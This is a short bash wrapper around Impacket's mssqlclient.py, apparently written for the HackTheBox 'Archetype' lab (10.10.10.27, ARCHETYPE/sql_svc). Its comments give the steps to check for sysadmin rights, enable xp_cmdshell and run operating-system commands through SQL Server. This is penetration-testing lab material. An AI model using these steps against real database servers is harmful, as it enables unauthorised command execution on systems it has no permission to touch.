#!/usr/bin/env bash

# Example
# connect_to_mssql.sh 10.10.10.27 ARCHETYPE/sql_svc 
# SELECT IS_SRVROLEMEMBER ('sysadmin') # reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server
# EXEC sp_configure 'Show Advanced Options', 1;
# reconfigure;
# sp_configure;
# EXEC sp_configure 'xp_cmdshell', 1
# reconfigure;
# xp_cmdshell "whoami"

mssqlclient.py $2@$1 -windows-auth
